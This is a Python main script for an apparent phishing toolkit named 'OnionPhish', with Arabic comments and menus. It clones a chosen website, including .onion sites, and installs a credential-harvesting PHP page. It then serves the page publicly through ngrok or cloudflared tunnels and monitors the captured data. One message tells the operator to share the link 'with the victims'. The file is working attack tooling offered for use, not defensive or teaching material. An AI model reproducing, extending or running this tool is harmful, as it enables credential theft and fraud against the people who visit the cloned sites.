#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OnionPhish - أداة استنساخ المواقع وحصد البيانات
تدعم المواقع العادية ومواقع .onion
"""

import os
import sys
import time
import subprocess
import threading
from colorama import init, Fore, Style
from modules.cloner import SiteCloner
from modules.harvester import Harvester
from modules.tunnel import Tunnel

# تهيئة colorama
init(autoreset=True)

class OnionPhish:
    """
    الفئة الرئيسية للأداة
    """
    
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.sites_dir = os.path.join(self.base_dir, 'sites')
        self.current_site_dir = os.path.join(self.sites_dir, 'current_site')
        self.log_file = os.path.join(self.current_site_dir, 'logs', 'harvested_data.txt')
        self.php_process = None
        
    def clear_screen(self):
        """مسح الشاشة"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """عرض الشعار"""
        banner = f"""
{Fore.RED}
   ____       _        _    ____ _     _     
  / __ \\     (_)      | |  / __ \\ |   (_)    
 | |  | |_ __ _  ___  | | | |  | | |__  _ ___ 
 | |  | | '__| |/ _ \\ | | | |  | | '_ \\| / __|
 | |__| | |  | | (_) || | | |__| | | | | \\__ \\
  \\____/|_|  |_|\\___/ |_|  \\____/|_| |_|_|___/
{Style.RESET_ALL}
{Fore.YELLOW}
           الأداة الذكية لاستنساخ المواقع
        تدعم المواقع العادية ومواقع .onion
{Style.RESET_ALL}
{Fore.CYAN}
[✓] تم التحميل - جاهز للعمل
{Style.RESET_ALL}
"""
        print(banner)
    
    def print_menu(self):
        """عرض القائمة الرئيسية"""
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}القائمة الرئيسية:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[1]{Style.RESET_ALL} استنساخ موقع جديد")
        print(f"{Fore.CYAN}[2]{Style.RESET_ALL} عرض البيانات المحفوظة")
        print(f"{Fore.CYAN}[3]{Style.RESET_ALL} تشغيل خادم محلي")
        print(f"{Fore.CYAN}[4]{Style.RESET_ALL} إنشاء نفق (Ngrok)")
        print(f"{Fore.CYAN}[5]{Style.RESET_ALL} إنشاء نفق (Cloudflared)")
        print(f"{Fore.CYAN}[6]{Style.RESET_ALL} مراقبة البيانات الواردة")
        print(f"{Fore.CYAN}[7]{Style.RESET_ALL} تشغيل كل الخدمات معاً")
        print(f"{Fore.CYAN}[0]{Style.RESET_ALL} خروج")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    
    def clone_site(self):
        """استنساخ موقع جديد"""
        self.clear_screen()
        print(f"{Fore.GREEN}[*] استنساخ موقع جديد{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'-'*40}{Style.RESET_ALL}")
        
        # طلب الرابط
        url = input(f"{Fore.CYAN}[?] أدخل رابط الموقع (مع http:// أو https://): {Style.RESET_ALL}")
        
        # تنظيف المجلد الحالي
        if os.path.exists(self.current_site_dir):
            os.system(f'rm -rf {self.current_site_dir}')
        os.makedirs(self.current_site_dir, exist_ok=True)
        
        # استنساخ الموقع
        cloner = SiteCloner(use_tor='.onion' in url)
        success = cloner.clone_site(url, self.current_site_dir)
        
        if success:
            # إنشاء ملف الحصد
            harvester = Harvester(self.log_file)
            harvester.create_phish_php(self.current_site_dir)
            
            print(f"\n{Fore.GREEN}[✓] تم استنساخ الموقع بنجاح!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] الموقع موجود في: {self.current_site_dir}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[✗] فشل استنساخ الموقع{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
    
    def show_logs(self):
        """عرض البيانات المحفوظة"""
        self.clear_screen()
        print(f"{Fore.GREEN}[*] البيانات المحفوظة{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'-'*40}{Style.RESET_ALL}")
        
        harvester = Harvester(self.log_file)
        harvester.show_all_logs()
        
        input(f"\n{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
    
    def start_local_server(self):
        """تشغيل خادم محلي PHP"""
        
        # التأكد من وجود الموقع
        if not os.path.exists(os.path.join(self.current_site_dir, 'index.html')):
            print(f"{Fore.RED}[✗] لا يوجد موقع مستنسخ. قم باستنساخ موقع أولاً.{Style.RESET_ALL}")
            input(f"{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
            return
        
        # إيقاف أي خادم سابق
        if self.php_process:
            self.php_process.terminate()
        
        # تشغيل خادم PHP جديد
        print(f"{Fore.YELLOW}[*] جاري تشغيل خادم PHP على المنفذ 8080...{Style.RESET_ALL}")
        
        self.php_process = subprocess.Popen(
            ['php', '-S', '0.0.0.0:8080', '-t', self.current_site_dir],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        print(f"{Fore.GREEN}[✓] تم تشغيل الخادم المحلي{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] الرابط المحلي: http://localhost:8080{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] الرابط في الشبكة: http://{self.get_local_ip()}:8080{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}اضغط Enter للعودة (الخادم سيستمر في العمل)...{Style.RESET_ALL}")
    
    def get_local_ip(self):
        """الحصول على IP المحلي"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def start_ngrok(self):
        """تشغيل نفق ngrok"""
        tunnel = Tunnel()
        url = tunnel.start_ngrok()
        
        if url:
            print(f"\n{Fore.GREEN}[✓] الرابط العام جاهز للمشاركة{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
    
    def start_cloudflared(self):
        """تشغيل نفق cloudflared"""
        tunnel = Tunnel()
        url = tunnel.start_cloudflared()
        
        if url:
            print(f"\n{Fore.GREEN}[✓] الرابط العام جاهز للمشاركة{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
    
    def start_monitoring(self):
        """بدء مراقبة البيانات"""
        self.clear_screen()
        print(f"{Fore.GREEN}[*] مراقبة البيانات الواردة{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'-'*40}{Style.RESET_ALL}")
        
        harvester = Harvester(self.log_file)
        
        # تشغيل المراقبة في Thread منفصل
        try:
            harvester.monitor()
        except KeyboardInterrupt:
            pass
        
        input(f"\n{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
    
    def run_all(self):
        """تشغيل كل الخدمات معاً"""
        self.clear_screen()
        print(f"{Fore.GREEN}[*] تشغيل كل الخدمات معاً{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'-'*40}{Style.RESET_ALL}")
        
        # التأكد من وجود موقع
        if not os.path.exists(os.path.join(self.current_site_dir, 'index.html')):
            print(f"{Fore.RED}[✗] لا يوجد موقع مستنسخ. قم باستنساخ موقع أولاً.{Style.RESET_ALL}")
            input(f"{Fore.YELLOW}اضغط Enter للعودة...{Style.RESET_ALL}")
            return
        
        # تشغيل الخادم المحلي
        self.php_process = subprocess.Popen(
            ['php', '-S', '0.0.0.0:8080', '-t', self.current_site_dir],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"{Fore.GREEN}[✓] تم تشغيل الخادم المحلي{Style.RESET_ALL}")
        
        # تشغيل ngrok
        tunnel = Tunnel()
        url = tunnel.start_ngrok()
        
        if url:
            print(f"\n{Fore.GREEN}[✓] الرابط العام: {url}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] شارك هذا الرابط مع الضحايا{Style.RESET_ALL}")
            
            # بدء المراقبة
            print(f"\n{Fore.YELLOW}[*] بدء مراقبة البيانات... اضغط Ctrl+C للإيقاف{Style.RESET_ALL}")
            harvester = Harvester(self.log_file)
            
            try:
                harvester.monitor()
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] إيقاف...{Style.RESET_ALL}")
    
    def run(self):
        """تشغيل الأداة"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input(f"\n{Fore.CYAN}[?] اختر رقم: {Style.RESET_ALL}")
            
            if choice == '1':
                self.clone_site()
            elif choice == '2':
                self.show_logs()
            elif choice == '3':
                self.start_local_server()
            elif choice == '4':
                self.start_ngrok()
            elif choice == '5':
                self.start_cloudflared()
            elif choice == '6':
                self.start_monitoring()
            elif choice == '7':
                self.run_all()
            elif choice == '0':
                print(f"\n{Fore.YELLOW}[*] إيقاف الخدمات...{Style.RESET_ALL}")
                if self.php_process:
                    self.php_process.terminate()
                print(f"{Fore.GREEN}[✓] إلى اللقاء!{Style.RESET_ALL}")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[!] اختيار غير صحيح{Style.RESET_ALL}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        app = OnionPhish()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] إيقاف...{Style.RESET_ALL}")
        sys.exit(0)
